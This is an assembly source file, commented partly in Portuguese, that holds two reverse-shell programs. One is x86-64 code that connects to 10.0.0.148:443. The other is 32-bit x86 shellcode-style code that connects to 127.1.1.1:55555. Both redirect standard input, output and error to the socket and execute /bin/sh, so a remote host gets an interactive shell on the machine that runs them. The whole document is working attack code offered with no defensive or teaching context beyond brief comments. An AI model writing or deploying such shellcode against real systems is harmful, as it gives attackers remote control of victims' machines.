; reverse shell assembly

.LC0:
        .string "10.0.0.148" ; ipv4
.LC1:
        .string "/bin/sh"    ; spawnar o sh
        ;.string "/bin/bash"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 48
        mov     DWORD PTR [rbp-36], edi
        mov     QWORD PTR [rbp-48], rsi
        mov     WORD PTR [rbp-32], 2
        mov     edi, OFFSET FLAT:.LC0
        call    inet_addr
        mov     DWORD PTR [rbp-28], eax
        mov     edi, 443     ; porta?
        call    htons
        mov     WORD PTR [rbp-30], ax
        mov     edx, 0
        mov     esi, 1
        mov     edi, 2
        call    socket
        mov     DWORD PTR [rbp-4], eax
        lea     rcx, [rbp-32]
        mov     eax, DWORD PTR [rbp-4]
        mov     edx, 16
        mov     rsi, rcx
        mov     edi, eax
        call    connect
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 0
        mov     edi, eax
        call    dup2
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 1
        mov     edi, eax
        call    dup2
        mov     eax, DWORD PTR [rbp-4]
        mov     esi, 2
        mov     edi, eax
        call    dup2
        mov     edx, 0
        mov     esi, 0
        mov     edi, OFFSET FLAT:.LC1
        call    execve
        mov     eax, 0
        leave
        ret
        
; #################################################

global _start

section .text

_start:
  ; Host
  push 0x0101017f  ; Número "127.1.1.1" em hex em ordem reversa
  pop esi

  ; Porta
  push WORD 0x03d9  ; Número da porta "55555" em hex em ordem reversa
  pop edi

	
  ; syscalls (/usr/include/asm/unistd_32.h)
  ; socketcall numbers (/usr/include/linux/net.h)

  ; Creating the socket file descriptor
  ; int socket(int domain, int type, int protocol);
  ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

  push 102
  pop eax		; syscall 102 - socketcall
  cdq

  push 1
  pop ebx		; socketcall type (sys_socket 1)

  push edx		; IPPROTO_IP = 0 (int)
  push ebx		; SOCK_STREAM = 1 (int)
  push 2		; AF_INET = 2 (int)

finalint:
  mov ecx, esp          ; ptr to argument array
  int 0x80              ; kernel interruption

  xchg ebx, eax  ; set ebx with the sockfd

	
  ; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
  ; int dup2(int oldfd, int newfd);
  ; dup2 (clientfd, ...)

  pop ecx

dup_loop:
  mov al, 63            ; syscall 63 - dup2
  int 0x80

  dec ecx
  jns dup_loop


  ; Connecting the duplicated file descriptor to the host
  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  ; connect(sockfd, [AF_INET, 55555, 127.1.1.1], 16)

  mov al, 102           ; syscall 102 - socketcall
  ; socketcall type (sys_connect) 3 - ebx already has it

  ; host address structure
  push esi              ; IP number
  push di               ; port in byte reverse order = 55555 (uint16_t)
  push WORD 2           ; AF_INET = 2 (unsigned short int)
  mov ecx, esp          ; struct pointer

  ; connect arguments
  push 16               ; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
  push ecx              ; sockaddr_in struct pointer (struct sockaddr *)
  push ebx              ; socket fd (int)

  mov ecx, esp

  int 0x80

  ; Finally, using execve to substitute the actual process with /bin/sh
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  ; exevcve("/bin/sh", NULL, NULL)

  mov al, 11            ; execve syscall

  ; execve string argument
  push edx              ; Byte nulo
  push 0x68732f2f       ; "//sh"
  push 0x6e69622f       ; "/bin"

  mov ebx, esp          ; ptr para ["bin//sh", NULL] string
  push edx              ; null ptr para argv
  push ebx              ; null ptr para envp

  jmp finalint          ; e jump para bingo
